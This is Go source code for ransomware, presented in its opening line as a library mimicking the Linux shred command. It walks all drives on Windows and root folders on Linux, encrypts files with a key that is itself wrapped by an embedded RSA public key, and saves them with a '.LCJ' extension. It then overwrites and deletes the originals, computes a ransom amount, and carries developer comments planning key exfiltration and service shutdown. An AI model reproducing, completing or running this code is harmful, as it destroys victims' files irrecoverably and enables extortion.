// Package shred is a golang library to mimic the functionality of the linux shred command
package main

// lisandro : delete all prints
// lisandro : sc delete|stop <service> (in cmd, delete|stop the service)

// lisandro : change the encryption swipe time from 3 to 2 ? (1?)

// change the key var by another random string at the end of the program

// send through an encrypted network the amount of file encrypted, datetime, the ID of the RANSMOWARE, and a e-mail
// and send with the message the encryption key

import (
	"crypto/aes"
	"crypto/cipher"
	"crypto/rand"
	"crypto/rsa"
	"crypto/sha256"
	"crypto/x509"
	"encoding/base64"
	"encoding/pem"
	"errors"
	"fmt"
	"io"
	"io/ioutil"
	"log"
	"os"
	"path/filepath"
	"reflect"
	"runtime"
	"strings"
	"time"
)

var key []byte
var file_count int
var operating_system string
var ext_blacklist = []string{
	"LCJ",
	"dll",
	"exe",
	"iso",
	"img",
	"msi",
	"deb",
	"ini",
	"sys",
	"json",
	"msi",
	"msu",
	"mst",
	"ini",
	"img",
	"xml",
	"old", // lisandro : do i keep this ?

}
var WINDOWS_ff_blacklist = []string{
	"bootmgr",
	//"BOOTNXT",
	"Documents and Settings",
	"DumpStack.log",
	"DumpStack.log.tmp",
	//"pagefiles.sys", edode : included in ext_whitelist
	"Program Files",
	"Program Files (x86)",
	"ProgramData",
	//"swapfile.sys", edode : included in ext_whitelist
	"Windows",
	"System Volume Information",
	"lost+found",
	"Autodesk",

	"$Recycle.Bin", // lisandro : delete it ?
	"Recycle.Bin", // lisandro : delete it ?
}
var LINUX_ff_blacklist = []string{ // lisandro : evaluate symlink
	"bin",
	"boot",
	".cache",
	"dev",
	"etc",
	"initrd.img",
	"lib",
	"lib32",
	"lib64",
	"libx32",
	"lost+found",
	"media",
	"opt",
	"proc",
	"run",
	"sbin",
	"srv",
	"sys",
	"tmp",
	"usr",
	"var",
	"vmlinuz",
}

func init() {
	//rand.Seed not working
	//rand.Seed(time.Now().UnixNano())
	operating_system = detect_os()

}

func detect_os()(string){
	operating_sys := runtime.GOOS
	switch operating_sys {
	case "windows":
		return "windows"
	case "darwin":
		return "mac"
	case "linux":
		return "linux"
	default:
		return "windows"
	}
}

// ========= GENERAL =========
func Error(err error) (error){
	if err != nil{
		return err
	}
	return nil
}
// ========= END GENERAL =========
// ========= SHRED =========

// Conf is a object containing all choices of the user
type Conf struct {
	Times  int
	Zeros  bool
	Remove bool
}

// Path shreds all files in the location of path
// recursively. If remove is set to true files will be deleted
// after shredding. When a file is shredded its content
// is NOT recoverable so USE WITH CAUTION!!!

func (conf Conf) Path(path string) error {
	stats, err := os.Stat(path)
	Error(err)

	if stats.IsDir() {
		return conf.Dir(path)
	}

	return conf.File(path)
}

// Dir overwrites every File in the location of path and everything in its subdirectories
func (conf Conf) Dir(path string) error {
	var chErrors []chan error

	walkFn := func(path string, info os.FileInfo, err error) error {
		Error(err)

		if info.IsDir() {
			return nil
		}

		chErr := make(chan error)
		chErrors = append(chErrors, chErr)
		go func() {
			err := conf.File(path)
			chErr <- err
		}()

		return nil
	}

	if err := filepath.Walk(path, walkFn); err != nil {
		return err
	}

	for _, chErr := range chErrors {
		if err := <-chErr; err != nil {
			return err
		}
	}

	return nil
}

// File overwrites a given File in the location of path
func (conf Conf) File(path string) error {
	for i := 0; i < conf.Times; i++ {
		if err := overwrite_file(path, true); err != nil {
			return err
		}
	}

	if conf.Zeros {
		if err := overwrite_file(path, false); err != nil {
			return err
		}
	}

	if conf.Remove {
		var err = os.Remove(path)
		if err!=nil { return err }
	}

	return nil
}

func overwrite_file(path string, random bool) error {
	f, err := os.OpenFile(path, os.O_WRONLY, 0)
	if err != nil {
		return err
	}

	defer f.Close()

	info, err := f.Stat()
	Error(err)

	buff := make([]byte, info.Size())
	if random {
		if _, err := rand.Read(buff); err != nil {
			return err
		}
	}

	_, err = f.WriteAt(buff, 0)
	return err
}

// ========= END SHRED =========

// ========= ENCRYPT =========

func ParseRsaPublicKeyFromPemStr() (*rsa.PublicKey, error) {
	var public_key string =
		`-----BEGIN RSA PUBLIC KEY-----
MIICIjANBgkqhkiG9w0BAQEFAAOCAg8AMIICCgKCAgEAzDWv5CHdcXXm0/zidDK3
OskEhr+uulnIjkgyAxHWypif8zb4GQg0UVdfvoADMBPTlrtlLofb7dfex4uoFu+C
QUKG0MK5upKNH9cqkBwpZ/Mc3iEy5fbCmXYq034eKfBtXIn0ZqKpI88wMCfwzYhg
oDdrifgnxhQlLq2O+5knVEbspomTrIuk3Wa4c0ISpEG0FTbVAg6d9SZEmQQEJRte
H6sI6cUVqz/WCpTR2Y+YgOepFR4KrVdIp6P3hUxR0h1T9ta+xZx7IE9i7s/PR7nF
H+PSRaZdfMje1zV5eP7q9kyyeRGPiUi63Mc/olsifR+7tJWiJk5FuHJZLO3ED8ay
H8adslQQvZwMI64G2DOK/8bMaxbNYuIaxDiKyHI/yvvjK+PeHijomaX0eed+TaeI
nd20YLG/UGwntqwOdHCuBllpEHqtiaAW+rkBYt3Mw7DI22/8dFKb63+eC/kUlVQZ
bMwdwh1itYO3s9zqlsA1mw6q6es6CWKyftN+3ZjRbTZ5zP2fzt4oN2DreqPvQ3N5
mQol6woaxEqtFvOPhOUgvdZHwcIU8l5KZSThodvkveWfUt4QTCPOhpJhPmvMK2zA
Yf5Oh4DzwxhQBx1Xm6bWFoZblaYV6UwWRuj6EN9Tztmk7NwQWztXjfbU1QQAaB4c
Zc6Wn4O42nkRXdypLvTdUasCAwEAAQ==
-----END RSA PUBLIC KEY-----
`
	block, _ := pem.Decode([]byte(public_key))
	if block == nil {
		return nil, errors.New("failed to parse PEM block containing the key")
	}

	pub, err := x509.ParsePKIXPublicKey(block.Bytes)
	if err != nil {
		return nil, err
	}

	switch pub := pub.(type) {
	case *rsa.PublicKey:
		return pub, nil
	default:
		break // fall through
	}
	return nil, errors.New("Key type is not RSA")
}

func encrypt_encryption_key(k []byte) []byte {
	public_key, _  := ParseRsaPublicKeyFromPemStr()
	encryptedBytes, err := rsa.EncryptOAEP(
		sha256.New(),
		rand.Reader,
		public_key,
		[]byte(k),
		nil)
	if err != nil {
		panic(err)
	}
	return encryptedBytes
}

func rand_str(str_size int) string {
	var alphanum string =
		"0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz&'()[]{}*+-_!?.,;:"
	var bytes = make([]byte, str_size)
	rand.Read(bytes)
	for i, b := range bytes {
		bytes[i] = alphanum[b%byte(len(alphanum))]
	}
	return string(bytes)
}

func create_encryption_key() []byte {
	new_key := []byte(rand_str(32))
	encrypted_new_key :=  encrypt_encryption_key(new_key)
	err := ioutil.WriteFile("key", encrypted_new_key, 0644)
	if err != nil {
		fmt.Printf("Error creating Key file!")
		os.Exit(0)
	}
	return new_key
}

func encryption_key() {
	the_key, err := ioutil.ReadFile("key") //Check to see if a key was already created
	if err != nil {
		key = create_encryption_key() //If not, create one
	} else {
		key = the_key //If so, set key as the key found in the file
	}
}

func encrypt_file(inputfile string, outputfile string) {
	b, err := ioutil.ReadFile(inputfile) //Read the target file
	Error(err)
	ciphertext := encrypt(key, b)
	//fmt.Printf("%x\n", ciphertext)
	err = ioutil.WriteFile(outputfile, ciphertext, 0644)
	if err != nil {
		fmt.Printf("Unable to create encrypted file!\n")
		os.Exit(0)
	}
}

func encodeBase64(b []byte) []byte {
	return []byte(base64.StdEncoding.EncodeToString(b))
}

func encrypt(key, text []byte) []byte {
	block, err := aes.NewCipher(key)
	if err != nil {
		panic(err)
	}
	b := encodeBase64(text)
	ciphertext := make([]byte, aes.BlockSize+len(b))
	iv := ciphertext[:aes.BlockSize]
	if _, err := io.ReadFull(rand.Reader, iv); err != nil {
		panic(err)
	}
	cfb := cipher.NewCFBEncrypter(block, iv)
	cfb.XORKeyStream(ciphertext[aes.BlockSize:], b)
	return ciphertext
}

// ========= END ENCRYPT =========

func is_in_blacklist(val interface{}, array interface{}) (bool) {
	exists := false
	//index  := -1

	switch reflect.TypeOf(array).Kind() {
	case reflect.Slice:
		s := reflect.ValueOf(array)

		for i := 0; i < s.Len(); i++ {
			if reflect.DeepEqual(val, s.Index(i).Interface()) == true {
				//index = i
				exists = true
				return exists//, index
			}
		}
	}
	return exists//, index
}

func list_dir(path string)([]string){ // lisandro : check file extension here
	searchDir := path
	var fileList []string

	if operating_system == "linux" {
		e := filepath.Walk(searchDir, func(path string, f os.FileInfo, err error) error {
			fileList = append(fileList, path)
			return err
		})
		if e != nil {
			panic(e)
		}
	}

	if operating_system == "windows"{
		var disk_drives string              // edode : C:; I:; E:;
		var base_folder_and_childs []string // edode : base_folder_and_childs are folders like "Program Files/*"; "Windows/*"
		e := filepath.Walk(searchDir, func(path string, f os.FileInfo, err error) error {
			cut := strings.Split(path, "\\")
			disk_drives = cut[0]
			base_folder_and_childs = cut[1:]
			base_folder := cut[1]
			for _, ff := range(WINDOWS_ff_blacklist){
				if strings.ToLower(base_folder) == strings.ToLower(ff){
					return filepath.SkipDir
				}
			}
			z := strings.Join(base_folder_and_childs, "\\")
			disk_drives = disk_drives + "\\" + z
			if !is_dir(disk_drives){
				fileList = append(fileList, disk_drives)
			}
			return err
		})

		if e != nil {
			panic(e)
		}
	}
	return fileList
}

func list_root_dir(root string) ([]string) {
	var files []string
	fileInfo, err := ioutil.ReadDir(root)
	if err != nil {
		return files
	}
	for _, file := range fileInfo {
		files = append(files, file.Name())
	}
	return files
}

func get_all_files()([]string){
	var all_files 		 []string
	var root_dirs 		 []string
	var root_dirs_parsed []string

	if operating_system == "linux"{
		root_dirs = list_root_dir("/")
		for _, dirs := range(root_dirs){
			if !is_in_blacklist(dirs, LINUX_ff_blacklist){
				if !is_dir(dirs){
					if !is_symlink("/"+dirs){
						if len(all_files) == 0 {
							all_files = list_dir("/" + dirs)
						} else {
							temp := make([]string, len(all_files))
							copy(temp, all_files)
							all_files = list_dir("/" + dirs)
							for _, file := range(temp){
								all_files = append(all_files, file)
							}
						}
					}
				}
			}
		}
	}

	if operating_system == "windows"{
		connected_drives := getdrives()
		for _, drive := range(connected_drives){
			temp := list_root_dir(drive + ":\\")
			for _, files := range(temp){
				root_dirs = append(root_dirs, drive + ":\\" + files)
			}
		}
		for _, dirs := range(root_dirs){
			if !is_in_blacklist(strings.Split(dirs, "\\")[1], WINDOWS_ff_blacklist){
				root_dirs_parsed = append(root_dirs_parsed, dirs)
			}
		}
		for _, dirs := range(root_dirs_parsed){
			if is_dir(dirs){
				temp := list_dir(dirs)
				for _, files := range(temp){
					all_files = append(all_files, files)
				}
			} else {
				all_files = append(all_files, dirs)
			}
		}
	}
	return all_files
}

func getdrives() (r []string){
	for _, drive := range "ABCDEFGHIJKLMNOPQRSTUVWXYZ"{
		f, err := os.Open(string(drive)+":\\")
		if err == nil {
			r = append(r, string(drive))
			f.Close()
		}
	}
	return
}

func remove_to_index(s []string, index int) ([]string) {
	sub := make([]string, len(s))
	copy(sub, s)
	sub = append(sub[index:len(s)], s[len(s):]...)
	return sub
}

func is_dir(path string)(bool){
	name := path
	fi, err := os.Stat(name)
	if err != nil {
		fmt.Println(err)
		return false
	}
	switch mode := fi.Mode(); {
	case mode.IsDir():
		return true
	case mode.IsRegular():
		return false
	}
	return false
}

// lisandro : only works for linux -> add Windows support
func is_symlink(file string)(bool) {
	fi, err := os.Lstat(file)
	if err != nil{
		log.Fatal(err)
	}
	if fi.Mode()&os.ModeSymlink == os.ModeSymlink {
		return true
	} else {
		return false
	}
}

func file_to_byte(file string)(int64){
	fi, err := os.Stat(file)
	Error(err)
	return fi.Size()
}

func byte_to_mega(file int64)(float64){
	var file_size float64 = float64((file / 1024) / 1024)
	return file_size
}

func check_ext(file string) bool{
	ext_split := strings.Split(file, ".")
	file_ext  := ext_split[len(ext_split)-1:][0]
	for _, ext := range ext_blacklist {
		if file_ext == ext{
			fmt.Println(file)
			return true
		}
	}
	return false
}

func ransom_amount(files_encrypted int) int{
	return int(float32(files_encrypted) * 1.25)
}

func pass()(){
	_ = ""
}

func delete_blacklisted_ext(tree_files[]string)(){

}

func file_list(file_tree []string)() {

	shredconf := Conf{Times: 2, Zeros: true, Remove: true}
	start := time.Now()
	for i := 1; i <= 3; i++ { // edode : 50 150 and the left ones
		var max_size float64
		for _, file := range file_tree {

			//var pa *[]string
			//pa = &file_tree
			//fmt.Println("In for : ", &pa)

			if check_ext(file) || is_dir(file){
				file_tree = remove_to_index(file_tree, 1)
				continue
			}

			if i == 1 {
				max_size = 50
			} else if i == 2 {
				max_size = 150
			} else if i == 3  {
				max_size = 9999999999
			}

			file_byte := file_to_byte(file)
			size := byte_to_mega(file_byte)
			if size <= max_size {
				encrypt_file(file, file+".LCJ")
				shredconf.Path(file)
				file_tree = remove_to_index(file_tree, 1)
				file_count++
			} else {
				fmt.Println(file)
				file_tree = remove_to_index(file_tree, 1)
				file_tree = append(file_tree, file)
				continue
			}
		}
	}
	elapsed := time.Since(start)
	log.Printf("SECOND ELAPSED : %s", elapsed)
}

func main() { // GOOS=windows GOARCH=amd64 go build -o lcj.exe encryptor.go
	encryption_key()
	files := get_all_files()
	file_list(files)
	fmt.Println(file_count, ransom_amount(file_count))
	//file_list(path, false)
}























